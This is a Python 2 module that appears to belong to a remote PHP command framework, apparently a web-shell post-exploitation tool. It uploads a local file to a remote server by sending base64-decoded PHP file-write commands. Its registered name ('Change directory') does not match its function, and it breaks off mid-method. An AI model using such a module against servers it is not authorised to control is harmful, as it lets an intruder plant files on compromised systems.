from core.vector import PhpCmd
from core.module import Module
from core import messages
from core.loggers import log
import random
import hashlib
import base64


class Upload(Module):

    """Upload file to remote filesystem.

    Usage:
      file_upload <lfile> <rfile>

    """

    def initialize(self):

        self._register_infos(
            {
                'name': 'Change directory',
                'description': __doc__,
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory arguments
            arguments=[
                'lpath',
                'rpath'
            ],
            # Declare additional options
            options={
                'content': '',
                'vector': ''
            },
            vector_argument = 'vector')

        self._register_vectors(
            [
            PhpCmd(
              "(file_put_contents('${args['rpath']}', base64_decode('${content}'))&&print(1)) || print(0);",
              name = 'file_put_contents'
              ),

            PhpCmd(
              """($h=fopen("${args['rpath']}","a+")&&fwrite($h, base64_decode('${content}'))&&fclose($h)&&print(1)) || print(0);""",
              name = "fwrite"
              )
            ]
        )

    def run(self, args):

        # Load local file
        content_orig = args.get('content')
        if not content_orig:

            lpath = args.get('lpath')

            try:
                content_orig = open(lpath, 'r').read()
            except Exception, e:
                log.warning(
                  messages.generic.error_loading_file_s_s % (lpath, str(e)))
                return

        content = base64.b64encode(content_orig)

        # Check remote file existence
        rpath_exists = PhpCmd([ args['rpath'], 'exists' ], module = 'file_check').run()
        if rpath_exists:
            log.warning(messages.generic.error_file_s_already_exists % args['rpath'])
            return

        vector_name, result = self.find_first_result(
         arguments = { 'args' : args, 'content' : content },
         condition = lambda result: True if result == '1' else False
        )
